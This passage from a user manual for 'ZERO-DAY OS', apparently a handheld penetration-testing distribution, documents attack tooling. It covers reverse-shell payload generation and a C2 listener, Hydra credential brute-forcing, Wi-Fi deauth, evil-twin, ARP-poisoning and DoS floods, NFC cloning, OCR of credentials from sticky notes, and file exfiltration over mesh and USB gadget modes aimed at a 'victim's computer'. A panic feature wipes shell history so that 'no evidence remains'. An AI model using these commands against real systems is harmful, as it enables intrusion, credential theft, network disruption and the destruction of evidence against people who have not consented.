**Commands (via Command RX):** `ping`, `status` (battery/WiFi/CPU/disk JSON), `panic`, `stealth` (backlight toggle), `wifi:on|off|scan`, `bt:on|off`, `shell:<cmd>`, `file:ls|get|put:<path>`, `c6l:<cmd>`, `mesh:<cmd>`, `screen`, `reboot`, `shutdown`.

Status notifications broadcast every 10s — the app dashboard updates live.

Full Android/iOS companion protocol: `scripts/hardware/ble-remote/ANDROID_API.md`

---

## 17. Infrared Hacking

### Capture a signal
```bash
sudo ir-scan
# Point any remote at the IR transceiver
# Captures and decodes raw IR signals
# Saved to /opt/cardputer/loot/ir/
```

### Replay a captured signal
```bash
sudo ir-replay /opt/cardputer/loot/ir/signal_20260425_*.raw
# Replays the exact signal via IR transmitter
# Use case: turn on/off TVs, ACs, projectors
```

### Brute-force power codes
```sudo ir-brute tv power```
# Sends every known TV power code for common brands
# Use case: turn off every TV in a room
```

---

## 18. Camera & OCR

### Capture a still image
```bash
cam-snap                    # Saves to /opt/cardputer/loot/cam/
cam-snap /tmp/badge.jpg     # Custom output path
```

### Record video
```bash
cam-stream 10               # Record 10 seconds of H.264 video
```

### OCR (read text from camera)
```bash
cam-ocr                     # Capture + Tesseract OCR → stdout + text file
```

**Use cases:**
- Photograph a badge → OCR the name/ID
- Capture a screen → extract displayed text/data
- Read serial numbers, IP addresses, credentials on sticky notes

---

## 19. Reverse Shells & Payloads

### Encrypted C2 listener
```bash
# Start encrypted listener (default: port 4444):
quick-c2 listen                    # Encrypted with auto-generated TLS
quick-c2 listen 8443 no            # Plaintext (no encryption)

# Generate payload for target:
quick-c2 payload bash 10.0.0.1 4444       # Bash reverse shell
quick-c2 payload python 10.0.0.1 4444     # Python reverse shell
quick-c2 payload socat 10.0.0.1 4444     # Socat encrypted shell (use with TLS listener)
quick-c2 payload powershell 10.0.0.1 4444 # PowerShell reverse shell
quick-c2 payload netcat 10.0.0.1 4444    # Netcat shell
quick-c2 payload sh 10.0.0.1 4444        # Minimal sh shell
```

### Legacy shell tools
```bash
revshell-listen              # Default: port 4444
revshell-listen 8080         # Custom port
revshell-stabilize           # PTY/TTY upgrade cheatsheet
```

### Password cracking
```bash
# John the Ripper (on-device, works on 512MB RAM):
john --format=raw-md5 hashes.txt              # MD5 hashes
john --format=raw-sha256 hashes.txt            # SHA-256
john --format=nt hashes.txt                    # NTLM (Windows)
john --format=bcrypt hashes.txt                # bcrypt (slow but works)
john --wordlist=/usr/share/seclists/Passwords/rockyou.txt hashes.txt

# Hydra (online credential brute-forcing):
hydra -l admin -P /usr/share/seclists/Passwords/rockyou.txt ssh://192.168.1.1
hydra -l root -P wordlist.txt ftp://192.168.1.1
hydra -L userlist.txt -P passlist.txt http-post-form://192.168.1.1/login.php
```

### Handshake conversion (for off-device cracking)
```bash
# Convert captured .cap files for hashcat (desktop GPU cracking):
cap2hccapx /opt/cardputer/handshakes/handshake.cap output.hccapx
# Then transfer .hccapx to your desktop GPU cracker
```

### Searchsploit — find known exploits
```bash
searchsploit apache 2.4           # Search by keyword
searchsploit --exclude-poc windows remote  # Filter by type
searchsploit -x 12345              # Examine a specific exploit
```

---

## 20. Sub-GHz Radio (CC1101)

Requires a CC1101 module connected to the 2.54mm 14-pin expansion port (SPI).

### Scan Sub-GHz frequencies
```bash
sudo subghz-scan 433.92       # 433MHz band (most common)
sudo subghz-scan 315          # 315MHz band (Japan/Asia)
sudo subghz-scan 868          # 868MHz band (Europe)
sudo subghz-scan 915          # 915MHz band (Americas)
```

### Record a signal
```bash
sudo subghz-record 433.92 10  # Record 10 seconds at 433.92MHz
# Saved to /opt/cardputer/loot/rf/
```

### Replay a recorded signal
```bash
sudo subghz-replay /opt/cardputer/loot/rf/signal_*.raw
# Confirms before transmitting
# Default: 3 repeats at original frequency
```

> **Legal notice:** Transmitting on Sub-GHz frequencies may require a license in your jurisdiction. Only transmit on frequencies you are legally authorized to use.

---

## 21. NFC / RFID (PN532)

Requires a PN532 module connected to the Grove HY2.0-4P port (I2C mode, switches 1+2 ON).

### Read an NFC tag
```bash
sudo nfc-read
# Detects: UID, tag type (MIFARE Classic, NTAG, Ultralight)
# Dumps: NDEF records, MIFARE sectors
# Saves to /opt/cardputer/loot/nfc/
```

### Clone a tag
```bash
sudo nfc-clone AA:BB:CC:DD:EE:FF     # Clone by UID
sudo nfc-clone /opt/cardputer/loot/nfc/dump_*.mfd  # Clone from dump file
```

### Emulate a tag
```bash
sudo nfc-emulate mifare    # Emulate a MIFARE Classic tag
sudo nfc-emulate ntag      # Emulate an NTAG tag
sudo nfc-emulate AA:BB:CC:DD:EE:FF  # Emulate a specific UID
```

---

## 22. M5MonsterC5 — ESP32C5 Middle Manager Hub

The M5MonsterC5 runs custom ZERO-DAY firmware (forked from C5Lab/M5MonsterC5-CardputerADV) and acts as the **middle-manager hub** connecting Cardputer Zero to GPS, C6L, and Meshtastic — while also serving as the dedicated WiFi attack radio.

### Hub topology

```
Cardputer Zero (aarch64, main OS)
  └── USB/UART ──→ M5MonsterC5 (ESP32C5, middle manager)
                      ├── Grove IN  ← GPS Module v1.1 (AT6558 UART 9600)
                      ├── Grove OUT → Unit C6L (ESP32-C6 Zigbee/BLE/LCD)
                      └── LoRa radio → Meshtastic mesh node
```

The MonsterC5 firmware multiplexes all communication over a single serial connection:
- No prefix = WiFi attack output (upstream protocol)
- `GPS:` prefix = NMEA data from AT6558
- `C6L:` prefix = data from/to Unit C6L (Zigbee/BLE)
- `MESH:` prefix = Meshtastic messages

### Connecting the board

Plug the M5MonsterC5 into the USB-A port on the back of the Cardputer Zero. The `monsterctl` script auto-detects the serial connection by scanning `/dev/ttyUSB*`, `/dev/ttyACM*`, and `/dev/ttyAMA0` at 115200 baud.

Verify the connection:
```bash
monsterctl ping
# Expected response: pong
```

### Checking status

```bash
monsterctl status
# Shows: board firmware version, WiFi mode, connected clients, running attacks, GPS fix
```

### Scanning networks

```bash
monsterctl scan
# Lists all visible APs with: index, ESSID, BSSID, channel, encryption, signal strength
```

### Selecting targets

```bash
monsterctl select 1        # Select AP #1 from scan results
monsterctl select 1 3      # Select APs #1 and #3
```

### Attack commands

**Deauth attack:**
```bash
monsterctl scan
monsterctl select 2
monsterctl deauth
# Sends deauth frames to all clients of the selected AP
```

**Evil twin:**
```bash
monsterctl select 1
monsterctl evil_twin
# Clones selected AP, starts captive portal
```

**WPA3 SAE overflow:**
```bash
monsterctl select 4
monsterctl sae_overflow
# Floods WPA3 SAE handshake to trigger DoS
```

**Karma attack:**
```bash
monsterctl karma
# Responds to all probe requests, lures clients
```

**Handshake capture:**
```bash
monsterctl select 1
monsterctl handshake
# Captures WPA/WPA2 4-way handshake → saved on board SD card
```

**Sniffer mode:**
```bash
monsterctl sniffer
# Captures all WiFi traffic on current channel
```

**Blackout (mass deauth):**
```bash
monsterctl blackout
# Deauths all clients from all visible APs simultaneously
```

**SnifferDog (follow a client):**
```bash
monsterctl sniffer_dog
# Locks onto a specific client, follows channel hops
```

**Beacon spam:**
```bash
monsterctl beacon_spam
# Floods beacons with thousands of random SSIDs
```

**Rogue AP:**
```bash
monsterctl rogue_ap
# Starts a standalone rogue access point
```

**ARP poisoning:**
```bash
monsterctl arp_poison 192.168.1.1
# Poisons ARP cache for specified gateway
```

**Deauth detection:**
```bash
monsterctl deauth_detect
# Monitors for deauth frames in the area
```

**Wardriving:**
```bash
monsterctl wardrive
# Scans and logs all APs with GPS coordinates (if GPS module attached)
```

**Nmap scan via board:**
```bash
monsterctl nmap 192.168.1.0/24
# Port scan through the M5MonsterC5's WiFi connection
```

### Stopping attacks

```bash
monsterctl stop
# Stops all running attacks on the board
```

### Flashing firmware

```bash
monsterctl flash web          # Flash latest firmware from GitHub
monsterctl flash local        # Flash from local binary on SD card
monsterctl flash cardputer    # Flash from Cardputer SD card path
```

### Capturing looted credentials

```bash
monsterctl passwords         # Show captured credentials
monsterctl hosts             # Show discovered hosts
monsterctl probes            # Show captured probe requests
```

### Board WiFi connection

```bash
monsterctl wifi_connect "SSID" "password"   # Connect board to a network
monsterctl wifi_disconnect                   # Disconnect board from WiFi
```

### Board utilities

```bash
monsterctl gps              # Show GPS coordinates (if GPS module attached)
monsterctl channel_time 200 # Set dwell time per channel (200ms)
monsterctl list_sd          # List files on board's SD card
monsterctl list_html        # List captive portal HTML pages on board
```

### GPS passthrough (Grove IN)

The GPS Module v1.1 (AT6558) is connected to MonsterC5's Grove IN port. NMEA data is forwarded to Cardputer Zero:

```bash
monsterctl gps m5             # Set GPS module type (default for M5Stack GPS v1.1)
monsterctl gps_passthrough    # Stream raw GPS NMEA data to Cardputer Zero
monsterctl gps raw            # Alias for gps_passthrough
monsterctl hub_status         # Show Grove topology and passthrough status
```

### C6L passthrough (Grove OUT)

The Unit C6L (ESP32-C6) connects to MonsterC5's Grove OUT port. Commands are routed through MonsterC5:

```bash
monsterctl c6l_passthrough    # Stream C6L serial data
monsterctl c6l_cmd ZIGBEE_SCAN  # Send command to C6L via MonsterC5
monsterctl c6l_cmd BLE_SCAN    # Scan BLE via C6L
monsterctl c6l_cmd 'LCD:1:hello'  # Display text on C6L LCD
```

Or use `c6l-ctl` which automatically routes through MonsterC5:

```bash
c6l-ctl zigbee scan           # Automatically routes via monsterctl c6l_cmd
c6l-ctl ble scan              # Same routing
c6l-ctl lcd text "OK"         # LCD text also routed through MonsterC5
```

### C6L direct BLE

The Cardputer Zero can also connect directly to C6L via Bluetooth — no MonsterC5, no cables needed. This uses the Cardputer Zero's built-in BT 4.2/BLE adapter to pair with C6L's BLE 5.0 radio:

```bash
c6l-ctl ble connect            # Scan and pair to C6L via BLE
c6l-ctl ble pair               # Scan and pair C6L via direct BLE (no MonsterC5)
C6L_MODE=ble c6l-ctl <cmd>    # Route any command over BLE (bypasses MonsterC5)
C6L_MODE=ble c6l-ctl zigbee scan  # Zigbee scan via direct BLE to C6L
C6L_MODE=ble c6l-ctl lcd text "hello"  # LCD text via BLE
```

The BLE path is useful when:
- MonsterC5 is not connected (standalone operation)
- You need wireless C6L control without USB cables
- C6L is deployed remotely as a Zigbee/BLE sensor node

### Meshtastic LoRa mesh

The ESP32C5 runs Meshtastic natively alongside WiFi attacks:

```bash
monsterctl mesh status        # Check mesh node status
monsterctl mesh start         # Start Meshtastic node
monsterctl mesh send 1 "hello"  # Send message to channel 1
monsterctl mesh config        # Show mesh configuration
monsterctl mesh stop          # Stop mesh node
```

### Firmware

The MonsterC5 runs custom ZERO-DAY firmware forked from C5Lab/M5MonsterC5-CardputerADV:

```bash
monsterctl flash local        # Flash ZERO-DAY custom firmware
monsterctl flash upstream     # Flash upstream JanOS firmware
monsterctl flash cardputer    # Flash CardputerADV app (ESP32S3)
```

### Links

- [M5MonsterC5-CardputerADV](https://github.com/C5Lab/M5MonsterC5-CardputerADV) — upstream hardware/firmware
- [ZERO-DAY fork](https://github.com/jayis1/M5MonsterC5-zeroday) — custom firmware with GPS, C6L routing, Meshtastic
- [Firmware spec](firmware/monsterc5/README.md) — build instructions and serial protocol

---

## 24. Ragnar Reconnaissance

[Ragnar](https://github.com/PierreGode/Ragnar) is a comprehensive Python-based network reconnaissance platform with AI-powered analysis, Nuclei scanning, ZAP integration, traffic analysis, and a web dashboard. It requires 2–8GB RAM — far too heavy for the Cardputer Zero's 512MB.

ZERO-DAY OS provides three lightweight scripts inspired by Ragnar's core capabilities, each running in <50MB RAM using pure bash + curl + jq.

### Why not full Ragnar?

| Resource | Cardputer Zero | Ragnar minimum |
|---|---|---|
| RAM | 512MB (382MB free) | 2–8GB |
| Python deps | Limited | Full ML stack, Scikit-learn, etc. |
| Dashboard | No web browser | Flask/Dash web UI |
| Nuclei + ZAP | No Go runtime, too heavy | Required |

### ragnar-scan — Autonomous 3-phase network recon

```bash
# Quick scan (top ports, ~30 seconds):
ragnar-scan eth0 quick

# Full scan (all 65535 ports, ~5 minutes):
ragnar-scan eth0 full

# Vulnerability scan (nmap vuln scripts):
ragnar-scan eth0 vuln

# Stealth scan (SYN scan, no ping):
ragnar-scan eth0 stealth
```

The scan runs three phases automatically:
1. **Discover** — ARP scan + ping sweep to find live hosts
2. **Scan** — Nmap port scan with the selected profile
3. **Summarize** — Collate results into a human-readable report saved to `/opt/cardputer/loot/recon/`

### threat-intel — CVE and CISA vulnerability lookup

```bash
# Look up a specific CVE:
threat-intel cve CVE-2024-21762
# Shows: description, CVSS score, affected products, references

# Search CISA Known Exploited Vulnerabilities:
threat-intel search fortinet
# Shows: all CISA KEV entries matching "fortinet"

# Check known vulnerabilities for a service:
threat-intel check openssh 8.9
# Shows: known CVEs affecting OpenSSH 8.x

# Show recently added CISA KEV entries:
threat-intel recent
# Shows: vulnerabilities added to CISA KEV catalog in the last 30 days
```

### device-classify — Network device classification

```bash
# Classify devices from an nmap XML output:
device-classify /opt/cardputer/loot/recon/scan_*.xml
# Uses vendor OUI + service fingerprinting to classify:
#   - Network infrastructure (routers, switches, APs)
#   - IoT devices (cameras, smart TVs, printers)
#   - Workstations (Windows, Linux, macOS)
#   - Servers (web, mail, database)

# Pipe directly from ragnar-scan:
ragnar-scan eth0 quick
device-classify /opt/cardputer/loot/recon/scan_*.xml
```

### Combining ragnar-scan with threat-intel

```bash
# Full recon workflow:
ragnar-scan eth0 full                    # Phase 1-3: discover, scan, summarize
threat-intel check apache 2.4            # Check vulns for discovered services
threat-intel cve CVE-2024-XXXX           # Look up specific CVEs from the report
device-classify /opt/cardputer/loot/recon/scan_*.xml  # Classify discovered devices
```

### Running full Ragnar on a separate machine

For the complete Ragnar experience (AI analysis, Nuclei scanning, ZAP, traffic analysis, web dashboard), run Ragnar on a separate machine with 8GB+ RAM and use ZERO-DAY OS as your hands-on attack tool:

```bash
# On the powerful machine:
git clone https://github.com/PierreGode/Ragnar
cd Ragnar
pip install -r requirements.txt
python ragnar.py

# On Cardputer Zero:
ragnar-scan eth0 full    # Lightweight recon, feed results to Ragnar
```

---

## 25. SDR & Hardware Tools

Requires an RTL-SDR USB dongle connected to the USB-A port for SDR operations. GPIO probing works with built-in hardware.

### SDR frequency scan
```bash
sudo sdr-scan                    # Scan 433MHz band for 10 seconds (default)
sudo sdr-scan 315.0-316.0 5     # Scan 315MHz band for 5 seconds
sudo sdr-scan 868.0-869.0 30    # Scan 868MHz (EU) for 30 seconds
sudo sdr-scan 88.0-108.0 15     # Scan FM radio band
```

Output: CSV frequency sweep + signal peaks, saved to `/opt/cardputer/loot/sdr/`.

### Raw RF capture
```bash
sudo rf-capture                           # Capture 433.92MHz for 10s at 2.4Msps
sudo rf-capture 315.0 5                   # Capture 315MHz for 5s
sudo rf-capture 868.0 30 1200000          # Capture 868MHz for 30s at 1.2Msps
sudo rf-capture 1090.0 60                  # Capture ADS-B (aircraft) for 60s
```

Output: Raw IQ file + metadata, saved to `/opt/cardputer/loot/rf/`.

### GPIO/I2C/SPI/UART probe
```bash
sudo gpio-probe
# Enumerates all I2C devices, SPI devices, UART ports, and GPIO state
# Shows Grove + ExtPort pin mappings
```

**Supported SDR dongles:**
- RTL-SDR v3 / v4
- Nooelec NESDR Smart
- Any RTL2832U-based USB dongle

> **Note:** `hackrf` and `soapysdr-tools` are not included in the default image (too heavy for 512MB armhf). Install manually with `apt install hackrf soapysdr-tools` if needed.

---

## 26. Meshtastic Mesh Networking

Meshtastic can connect three ways:

| Path | Connection | Cables | Use Case |
|---|---|---|---|
| **LoRa hat** | Cardputer Zero → UART → LoRa module | Grove cable | Primary, direct serial |
| **MonsterC5** | Cardputer Zero → USB → MonsterC5 → LoRa | USB-C | Through hub, multiplexed |
| **C6L via BLE** | Cardputer Zero → BT 4.2 → C6L BLE 5.0 | None (wireless) | Standalone, no cables |

> **Note:** LoRa hat and PN532 NFC share the Grove port — they cannot be used simultaneously.

### Install and configure
```bash
mesh-chat install                  # Auto-detect module, install Python CLI
mesh-chat install --port /dev/ttyUSB0  # Specify serial port
```

### Full setup with mesh-setup
```bash
mesh-setup install                # Full install — CLI, dependencies, wiring guide
mesh-setup init                   # Initialize and configure a LoRa node
mesh-setup info                   # Show node info, battery, signal, GPS
```

`mesh-setup` provides a deeper setup experience than `mesh-chat install`, including serial port detection, region configuration, and wiring instructions.

### Send messages
```bash
mesh-chat send All "Hello team"     # Broadcast to all nodes
mesh-chat send 1 "Target found"     # Send to channel 1
mesh-chat send !abc123 "Ready"     # Send to specific node
```

### Listen and chat
```bash
mesh-chat listen                    # One-time message dump
mesh-chat listen 0                  # Continuous monitoring
mesh-chat chat 1                    # Interactive chat on channel 1
```

### Node management
```bash
mesh-chat nodes                     # List all discovered nodes
mesh-chat info                       # Show local node status
```

### Mesh via C6L Bluetooth

Connect to a Meshtastic node running on C6L (ESP32-C6) over BLE — no serial cable or MonsterC5 needed:

```bash
mesh-chat ble                       # Scan for C6L Meshtastic node, pair via BLE
mesh-chat ble --connect <MAC>       # Connect to a specific C6L by MAC address
mesh-chat ble --chat 1              # Interactive chat over BLE to C6L
mesh-chat ble --send "hello"        # Send message over BLE
```

The BLE path uses the Cardputer Zero's built-in Bluetooth 4.2 adapter to connect directly to C6L's BLE 5.0 radio. C6L then relays messages to the Meshtastic mesh over its LoRa radio. This is ideal for:
- Standalone deployment (no MonsterC5 hub)
- Wireless meshchat when USB is occupied
- Remote C6L sensor nodes reporting over BLE

### Advanced mesh-setup commands
```bash
mesh-setup send "Target found"       # Send encrypted message
mesh-setup send "Exfil data" !abc123 # Send to specific node
mesh-setup listen                    # Continuous message monitoring
mesh-setup chat                      # Interactive chat mode
mesh-setup relay                     # Enable mesh relay / internet bridge
mesh-setup nodes                     # List discovered mesh nodes
mesh-setup exfil /path/to/file       # Exfiltrate file over mesh (chunked base64)
```

---

## 27. USB Gadget Mode

Plug the Cardputer Zero's USB-C port into a victim's computer. Flip the USB-C switch to "device" mode.

### HID (Keyboard) — Rubber Ducky
```bash
sudo usb-gadget-mode hid
# Cardputer enumerates as a USB keyboard
# Loads and executes payloads from /opt/cardputer/payloads/ducky.txt
```

### Mass Storage — Exfiltration
```bash
sudo usb-gadget-mode mass
# Cardputer appears as a USB drive
# Victim's files are accessible; /opt/cardputer/loot/ is exposed
```

### Network Adapter — Bridge
```bash
sudo usb-gadget-mode ncm
# Cardputer becomes a USB network adapter
# Victim's traffic can be routed through the Cardputer
```

### Serial Console — Debug
```bash
sudo usb-gadget-mode serial
# Cardputer provides a USB serial console
# Useful for headless debug from another machine
```

### Disable gadget mode
```bash
sudo usb-gadget-mode off
```

---

## 28. Power Management

ZERO-DAY OS has three power profiles tuned for the 1500mAh battery:

### Performance (~4 hours)
```bash
sudo power-mode performance
# 1GHz quad-core, all radios, full brightness
# Use when: actively attacking, need max speed
```

### Balanced (~6 hours)
```bash
sudo power-mode balanced
# 800MHz dual-core, WiFi on, BT off, medium brightness
# Use when: passively monitoring, waiting for targets
```

### Stealth (~10 hours)
```bash
sudo power-mode stealth
# 600MHz single-core, all radios off, dim screen
# Use when: lying low, preserving battery, going dark
```

### Battery check
```bash
cardputer-battery
# Output: Voltage, Capacity %, Status, Time remaining
```

### Toggle WiFi radio
```bash
cardputer-wifi-toggle     # Toggle wlan0 on/off
# Saves ~30mA when off — significant for battery life
```

---

## 29. Panic System

The panic system is designed for the moment you need to disappear — fast.

### Trigger panic
```
Fn + P
```

**What happens in 0.3 seconds:**

| Phase | Duration | Action |
|---|---|---|
| Kill | 0.1s | `kill -9` every offensive process (aircrack, bettercap, nmap, john, hydra, all shells) |
| Wipe | 0.1s | Remove `~/.bash_history`, `/tmp/*`, tmux history |
| Sanitize | 0.1s | Clear terminal, reset screen buffer |
| Silence | instant | `rfkill block all` — kill WiFi + BT radio emissions |

The screen shows a clean login prompt. No evidence remains visible.

### Then go stealth
```
Fn + Space
```

- Backlight off — the device appears completely powered down
- No visible light, no RF emissions
- Press any key to wake the screen

### Panic log
All panic events are recorded:
```bash
cat /opt/cardputer/panic.log
# [2026-04-25 14:30:00] PANIC TRIGGERED
# [2026-04-25 14:30:00] PANIC COMPLETE
```

---

## 30. OpenCode (Pocket IDE)

OpenCode is an AI-assisted code editor you launch from the keyboard. It runs in a tmux split — editor on top, live console on the bottom.

### Launch
```bash
opencode-session                  # Full workspace at /opt/cardputer/workspace/
opencode-session /path/to/file    # Open specific file
opencode-session /path/dir name  # Open file in directory
```

Or press `Fn + O` from anywhere.

### Quick AI prompt
```bash
opencode-ask "How do I crack a WPA3 handshake?"    # Ask a question inline
opencode-ask                                         # Interactive — type your question
Fn + A                                               # Same thing from anywhere
```

Saves questions to `/opt/cardputer/workspace/` for later review. If the AI backend isn't available yet, the question is stored for when it is.

> **armhf note:** The native OpenCode binary is not yet available for armhf. A stub is installed that provides the same tmux-based workflow using `nano` as the editor. When an armhf binary is released, `opencode` will be updated automatically via the first-boot service.

---

## 31. Troubleshooting

### Compositor not starting

```bash
# Check which display service is active:
systemctl status zeroday-comp.service
systemctl status zeroday-gui.service
systemctl status zeroday-tui.service

# Check compositor logs:
journalctl -u zeroday-comp.service --no-pager -n 50

# Manually start the compositor chain:
zeroday-comp --client /usr/local/bin/cyber_launcher --no-cursor --hdmi-fps 30 --hdmi-auto
# Or fall back to cage:
cage -- /usr/local/bin/cyber_launcher

# If all Wayland fails, start X11 fallback:
startx /usr/local/bin/cyber_launcher
```

### Terminal issues

```bash
# If zeroday-term crashes, stterm is the fallback:
stterm -e bash

# Check terminal config:
cat /etc/zeroday/term.env

# Terminal status bar not showing:
ZERODAY_TERM_STATUS_BAR=1 zeroday-term
```

### File explorer issues

```bash
# If zeroday-fm crashes, mc (midnight commander) is the fallback:
mc

# Check file explorer config:
cat /etc/zeroday/fm.env

# Start in a specific directory:
zeroday-fm /path/to/dir

# Force show hidden files:
ZERODAY_FM_SHOW_HIDDEN=1 zeroday-fm
```

### Trail navigation issues

```bash
# If trail-ctl is not running, start it:
trail-ctl start

# Check current status:
trail-ctl status

# If WiFi scanning fails, verify interface:
iw dev wlan0 scan dump

# Clear corrupted breadcrumbs:
trail-ctl clear

# Check trail daemon logs:
journalctl -u zeroday-trail --no-pager -n 50
```

### GPS issues

```bash
# Probe GPS module on UART:
gps-ctl probe

# If GPS_UART is wrong, try:
GPS_UART=/dev/ttyAMA0 gps-ctl probe
GPS_UART=/dev/ttyUSB0 gps-ctl probe

# Check GPS config:
gps-ctl config

# View raw NMEA data:
gps-ctl nmea
```

### OLED display issues

```bash
# Detect SH1107 on I2C:
ext-display unit-lcd on

# Check I2C bus:
i2cdetect -y 1

# Install luma.oled if missing:
oled-ctl install

# Test display:
oled-ctl test

# If address is 0x3D instead of 0x3C:
OLED_I2C_ADDR=0x3D oled-ctl test
```

### System won't boot
- Verify the microSD is properly inserted
- Check the image was written correctly (re-flash)
- Connect via serial console (115200 baud) for boot messages:
  ```
  screen /dev/ttyUSB0 115200
  ```

### WiFi not connecting
```bash
# Check radio status:
rfkill list

# Unblock if blocked:
rfkill unblock all

# Try manual connection:
wpa_supplicant -B -i wlan0 -c /etc/wpa_supplicant/wpa_supplicant.conf
dhclient wlan0
```

### Dongle not appearing as wlan1
```bash
# Check USB device:
lsusb | grep -i realtek

# Check driver:
lsmod | grep 8821

# Reinstall:
dongle-setup install
```

### Out of disk space
```bash
# Check usage:
df -h

# Clean package cache:
apt clean
apt autoremove --purge -y

# Remove large wordlists (keep only essential):
rm -rf /usr/share/seclists/Passwords/databases
rm -rf /usr/share/seclists/Discovery
```

### Low memory
```bash
# Check RAM:
free -h

# Kill heavy processes:
pkill -f bettercap
pkill -f wireshark

# Switch to stealth mode (saves ~50MB RAM):
sudo power-mode stealth
```

### SSH connection refused
```bash
# Verify SSH is running:
systemctl status ssh

# Start it:
systemctl start ssh

# Check firewall:
iptables -L -n
```

---

## 32. File System Layout

### System directories
| Path | Purpose |
|---|---|
| `/opt/cardputer/` | All user data — tools, configs, loot |
| `/opt/cardputer/handshakes/` | WPA handshake captures (`.cap` files) |
| `/opt/cardputer/pmkid/` | PMKID hash captures |
| `/opt/cardputer/payloads/` | Generated payloads (quick-c2 output) |
| `/opt/cardputer/workspace/` | OpenCode working directory |
| `/opt/cardputer/loot/` | All captured data, organized by type |
| `/opt/cardputer/config/` | Tool configs, attack profiles, wordlists |
| `/usr/local/bin/` | All one-key hacking scripts |
| `/usr/local/bin/zeroday-comp` | Rust Wayland compositor (~1.0MB) |
| `/usr/local/bin/zeroday-term` | Rust terminal emulator (~1.2MB) |
| `/usr/local/bin/zeroday-fm` | Rust file explorer (~1.9MB) |
| `/usr/local/bin/fm` | Symlink → zeroday-fm (compatibility) |
| `/usr/local/bin/zeroday-trail` | Rust breadcrumb nav daemon (~1.1MB) |
| `/usr/local/bin/trail-ctl` | Trail control script |
| `/usr/local/bin/gps-ctl` | GPS module controller |
| `/usr/local/bin/ext-display` | External display manager |
| `/usr/local/bin/oled-ctl` | SH1107 OLED controller |
| `/usr/local/bin/st` | Symlink → zeroday-term (compatibility) |
| `/etc/zeroday/comp.env` | Compositor environment config |
| `/etc/zeroday/term.env` | Terminal emulator config |
| `/etc/zeroday/fm.env` | File explorer config |
| `/etc/zeroday/trail/config.env` | Trail daemon config |
| `/opt/cardputer/trail/breadcrumbs/` | Trail WiFi fingerprint data |
| `/opt/cardputer/trail/waypoints/` | GPS waypoints |
| `/opt/cardputer/trail/gps-tracks/` | GPS track exports |
| `/etc/i3/config` | i3 window manager keybindings |
| `/etc/X11/xorg.conf` | X11 configuration for ST7789 LCD |
| `/etc/zeroday-release` | Build info and version |

### RAM-mounted directories (tmpfs)
These are wiped on reboot — designed to reduce SD card writes:

| Path | Size | Purpose |
|---|---|---|
| `/tmp` | 64MB | Temporary files |
| `/var/log` | 16MB | System logs (lost on reboot) |
| `/var/tmp` | 16MB | Persistent temp files |

> **Note:** If you need to preserve logs across reboots, copy them to `/opt/cardputer/loot/` before shutting down.

---

## 33. Expansion Hardware Wiring

### CC1101 Sub-GHz Transceiver (2.54mm 14-Pin ExtPort — SPI)

```
CC1101 Pin    →    Cardputer Zero Pin
─────────         ──────────────────
VCC (3.3V)   →    Pin 1 (3.3V)
GND          →    Pin 2 (GND)
MOSI         →    Pin 4 (SPI0 MOSI)
MISO         →    Pin 5 (SPI0 MISO)
SCK          →    Pin 6 (SPI0 SCLK)
CSN          →    Pin 7 (SPI0 CE0)
GDO0         →    Pin 9 (GPIO)
GDO2         →    Pin 10 (GPIO)
```

> Pin assignments are PLACEHOLDER — will be finalized when hardware ships.

### PN532 NFC / RFID2 Module (NFC/CC1101 GPIO Hat — I2C Mode)

> Swap to LoRa hat for Meshtastic — only one hat at a time.

```
PN532 Pin     →    NFC/CC1101 GPIO Hat Grove Port
──────────         ──────────────────────────────
VCC           →    VCC
SDA           →    SDA — I2C data
SCL           →    SCL — I2C clock
GND           →    GND
```

### Meshtastic LoRa Module (LoRa Hat UART — swapped with NFC hat)

> Swap to NFC/CC1101 hat for PN532/RFID2 — only one hat at a time.

```
LoRa Pin      →    LoRa Hat Grove Port (UART)
─────────         ──────────────────────────
VCC           →    VCC
TX            →    RX — UART receive
RX            →    TX — UART transmit
GND           →    GND
```

> ⚠️ **Grove port topology:**
> - **Cardputer Zero Grove** → **M5MonsterC5 (IN)** — occupied by MonsterC5
>   - M5MonsterC5 has 2 more Grove ports: **GPS Module v1.1** (UART) + **Unit C6L** (OUT)
> - **GPIO hat slot** — swap between NFC/CC1101 hat and LoRa hat (only one at a time)
>   - NFC/CC1101 hat has extra Grove port: **SH1107 OLED** + **PN532/RFID2** (I2C)
>   - LoRa hat: **Meshtastic LoRa** (UART)
> - HDMI and SPI TFT use separate interfaces

### M5Stack OLED Unit SH1107 (NFC/CC1101 GPIO Hat Grove Port — I2C Mode)

```
OLED Pin       →    NFC/CC1101 GPIO Hat Grove Port
──────────          ──────────────────────────────
VCC (5V/3.3V) →    VCC
SDA            →    SDA — I2C data
SCL            →    SCL — I2C clock
GND            →    GND

I2C address: 0x3C (default) or 0x3D
```

### M5Stack GPS Module v1.1 (M5MonsterC5 Grove Port — UART Mode)

```
GPS Module v1.1 connects to M5MonsterC5's Grove port (not Cardputer Zero)

GPS Pin        →    M5MonsterC5 Grove Port
──────────          ──────────────────────
VCC            →    VCC
TX             →    RX — UART receive
RX             →    TX — UART transmit
GND            →    GND

GPS chip: AT6558 (GPS/BDS/GLONASS/GALILEO/QZSS)
Antenna: AT3335 patch
Baud rate: 9600 (default)
```

### M5Stack RFID2 Unit WS1850S (NFC/CC1101 GPIO Hat Grove Port — I2C Mode)

```
RFID2 Pin       →    NFC/CC1101 GPIO Hat Grove Port
─────────           ──────────────────────────────
GND (Black)     →    GND
5V (Red)         →    VCC
SDA (Yellow)     →    SDA — I2C data
SCL (White)      →    SCL — I2C clock

I2C address: 0x28 (WS1850S)
Chip: WS1850S (MFRC522-compatible)
Frequency: 13.56 MHz
Tags: MIFARE Classic/Ultralight, NTAG213/215/216, ISO 14443-A/B
```

```bash
rfid2-ctl probe              # Detect WS1850S on I2C
rfid2-ctl read               # Read RFID/NFC tag
rfid2-ctl detect             # Continuous tag detection
rfid2-ctl dump               # Dump tag contents
rfid2-ctl uid                 # Read UID only
rfid2-ctl config              # Show wiring and configuration
```

### M5Stack Unit C6L (M5MonsterC5 Grove OUT — I2C + UART)

```
Grove chain: Cardputer Zero → M5MonsterC5 (IN) → C6L (OUT)
  M5MonsterC5 also has GPS Module v1.1 on its other Grove port

C6L Pin          →    M5MonsterC5 Grove OUT
──────────            ──────────────────────
GND (Black)     →    GND
5V (Red)         →    VCC
SDA/TX (Yellow)  →    SDA/TX — I2C data or UART TX
SCL/RX (White)   →    SCL/RX — I2C clock or UART RX

I2C mode:  SW1=ON,  SW2=ON  (LCD control via I2C)
UART mode: SW1=OFF, SW2=OFF (serial communication)

